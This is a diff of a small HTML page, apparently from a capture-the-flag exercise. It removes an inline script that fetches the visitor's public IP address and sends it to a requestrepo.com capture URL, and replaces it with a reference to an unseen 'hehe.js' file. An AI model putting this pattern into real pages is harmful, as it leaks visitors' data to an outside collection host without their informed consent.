@@ -8,33 +8,6 @@
 <body>
     <button id="sendIPButton">Send IP Address</button>
     
-    <script>
-        document.getElementById('sendIPButton').addEventListener('click', () => {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => {
-                    if (!response.ok) {
-                        throw new Error('Network response was not ok');
-                    }
-                    return response.json();
-                })
-                .then(data => {
-                    const ip = data.ip;
-                    const url = `http://9zwev8yu.requestrepo.com/?ctf=${ip}`;
-                    fetch(url)
-                        .then(response => {
-                            if (!response.ok) {
-                                throw new Error('Network response was not ok');
-                            }
-                            console.log('IP Address sent successfully');
-                        })
-                        .catch(error => {
-                            console.error('Error sending IP Address:', error.message);
-                        });
-                })
-                .catch(error => {
-                    console.error('Error getting IP Address:', error.message);
-                });
-        });
-    </script>
+    <script src="hehe.js"></script>
 </body>
 </html>
